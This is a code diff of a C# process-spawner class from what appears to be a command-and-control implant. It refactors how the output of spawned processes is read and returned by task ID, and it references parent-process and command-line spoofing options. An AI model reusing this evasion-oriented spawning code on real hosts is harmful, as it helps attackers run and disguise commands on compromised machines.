@@ -8,15 +8,9 @@ using Agent.Models;
 
 namespace Agent.Utlities
 {
-    public class ProcessSpawner : IDisposable, ISpawner
+    public class ProcessSpawner : ISpawner
     {
         IMessageManager messageManager;
-        //string task_id { get; set; }
-        //public int parent { get; set; } = 0;
-        //public string commandline { get; set; }
-        //public string spoofedcommandline { get; set; }
-        //public bool output { get; set; } = false;
-        ////private IntPtr handle { get; set; }
         private SafeProcessHandle handle { get; set; }
         private Dictionary<string, SafeProcessHandle> processes = new Dictionary<string, SafeProcessHandle>();
         public ProcessSpawner(IMessageManager messageManager)
@@ -48,7 +42,6 @@ namespace Agent.Utlities
             }
 
             await messageManager.WriteLine($"Process Started with ID: {pInfo.dwProcessId}", opts.task_id, false);
-            SafeFileHandle safeStdOutRead = new SafeFileHandle(hStdOutRead, true);
 
             if (!opts.output)
             {
@@ -56,8 +49,7 @@ namespace Agent.Utlities
                 return true;
             }
 
-            GetProcessOutput(safeStdOutRead.DangerousGetHandle(), pInfo, opts.task_id);
-            CleanUp(hStdOutRead, hStdOutWrite, pInfo);
+            GetProcessOutput(hStdOutRead, hStdOutWrite, pInfo, opts.task_id);
 
             return true;
         }
@@ -265,59 +257,63 @@ namespace Agent.Utlities
 
             return result;
         }
-        private bool GetProcessOutput(IntPtr hStdOutRead, Native.PROCESS_INFORMATION pInfo, string task_id)
+        private bool GetProcessOutput(IntPtr hStdOutRead, IntPtr hStdOutWrite, Native.PROCESS_INFORMATION pInfo, string task_id)
         {
-            using (var cts = new CancellationTokenSource())
-            using (SafeFileHandle safeHandle = new SafeFileHandle(hStdOutRead, false))
-            using (var reader = new StreamReader(new FileStream(safeHandle, FileAccess.Read, 4096, false), true))
+            _ = Task.Run(() =>
             {
-                StringBuilder outputBuilder = new StringBuilder();
-                //char[] buf = new char[4096];
-
-                while (!cts.Token.IsCancellationRequested) // Loop to handle process output
+                using (var cts = new CancellationTokenSource())
+                using (SafeFileHandle safeHandle = new SafeFileHandle(hStdOutRead, false))
+                using (var reader = new StreamReader(new FileStream(safeHandle, FileAccess.Read, 4096, false), true))
                 {
-                    if (Native.WaitForSingleObject(pInfo.hProcess, 100) == 0) // If the process closed, tell the loop to stop
+                    StringBuilder outputBuilder = new StringBuilder();
+                    //char[] buf = new char[4096];
+
+                    while (!cts.Token.IsCancellationRequested) // Loop to handle process output
                     {
-                        cts.Cancel();
-                    }
-
-                    uint bytesToRead = 0;
-                    if (Native.PeekNamedPipe(hStdOutRead, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero)) // Check if we have bytes to read
-                    {
-                        if (bytesToRead == 0) // We don't have any bytes to read
+                        if (Native.WaitForSingleObject(pInfo.hProcess, 100) == 0) // If the process closed, tell the loop to stop
                         {
-                            if (cts.Token.IsCancellationRequested) // Check if we're supposed to exit
-                            {
-                                break;
-                            }
-                            else // Process just hasn't written anything yet
-                            {
-                                continue;
-                            }
-                        }
-                        else if (bytesToRead > 4096) // Limit the buffer size to 4096 to not overwhelm the agent
-                        {
-                            bytesToRead = 4096;
+                            cts.Cancel();
                         }
 
-                        try
+                        uint bytesToRead = 0;
+                        if (Native.PeekNamedPipe(hStdOutRead, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero)) // Check if we have bytes to read
                         {
-                            char[] buf = new char[bytesToRead];
-                            int bytesRead = reader.Read(buf, 0, (int)bytesToRead); // Read the char buffer into our previously allocated array
-
-                            if (bytesRead > 0) // We read some bytes, let's append it to the StringBuilder
+                            if (bytesToRead == 0) // We don't have any bytes to read
                             {
-                                messageManager.Write(new string(buf), task_id, false);
+                                if (cts.Token.IsCancellationRequested) // Check if we're supposed to exit
+                                {
+                                    break;
+                                }
+                                else // Process just hasn't written anything yet
+                                {
+                                    continue;
+                                }
                             }
-                        }
-                        catch (IOException ex)
-                        {
-                            // Handle IOException, if needed
-                            Console.WriteLine($"Error reading from process output: {ex.Message}");
+                            else if (bytesToRead > 4096) // Limit the buffer size to 4096 to not overwhelm the agent
+                            {
+                                bytesToRead = 4096;
+                            }
+
+                            try
+                            {
+                                char[] buf = new char[bytesToRead];
+                                int bytesRead = reader.Read(buf, 0, (int)bytesToRead); // Read the char buffer into our previously allocated array
+
+                                if (bytesRead > 0) // We read some bytes, let's append it to the StringBuilder
+                                {
+                                    messageManager.Write(new string(buf), task_id, false);
+                                }
+                            }
+                            catch (IOException ex)
+                            {
+                                // Handle IOException, if needed
+                                Console.WriteLine($"Error reading from process output: {ex.Message}");
+                            }
                         }
                     }
                 }
-            }
+                CleanUp(hStdOutRead, hStdOutWrite, pInfo);
+            });
 
             return true;
         }
@@ -407,20 +403,7 @@ namespace Agent.Utlities
 
             return true;
         }
-        public void Dispose()
-        {
-            throw new NotImplementedException();
-        }
 
-        public Task<bool> Spawn(string task_id, string commandline, int pid = 0, string spoofedcommandline = "")
-        {
-            throw new NotImplementedException();
-        }
-
-        public Task<bool> SpawnWithOutput(string task_id, string commandline, int pid = 0, string spoofedcommandline = "")
-        {
-            throw new NotImplementedException();
-        }
         public bool TryGetHandle(string task_id, out SafeProcessHandle? handle)
         {
             return this.processes.TryGetValue(task_id, out handle);
